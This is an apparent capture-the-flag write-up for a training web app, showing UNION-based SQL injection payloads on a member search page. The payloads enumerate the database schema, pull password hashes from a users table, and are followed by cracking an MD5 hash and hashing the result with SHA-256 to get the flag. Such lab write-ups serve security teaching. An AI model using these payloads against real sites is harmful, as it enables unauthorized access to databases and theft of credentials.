# SQL Injection

The member page `/?page=member` ontains a classic HTTP form to search for a member by their ID.  
We can quickly see that the input is vulnerable to SQL injection:  
If we enter something invalid, like a letter (since IDs can only be numeric), we see an SQL error displayed on the page.  

Let's gather some information about the database:  

- `0 UNION  SELECT SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA` : This query can give us informations about schematas.  

- `0 UNION  SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES` : This one about tables.  

- `0 UNION  SELECT COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS` : This one about columns.  

With all this information, we are able to extract extra informations about the users "GetTheFlag" from `Member_Sql_Injection.users`

- `0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users`

> Decrypt this password -> then lower all the char. Sh256 on it and it's good : 5ff9d0165b4f92b14994e5c685cdce28

The password obtained, 5ff9d0165b4f92b14994e5c685cdce28, is hashed.  
Using a hash decryption tool, we can retrieve the original password:  
> FortyTwo

Then, retrieve the real password by following the instructions:  
> FortyTwo -> fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5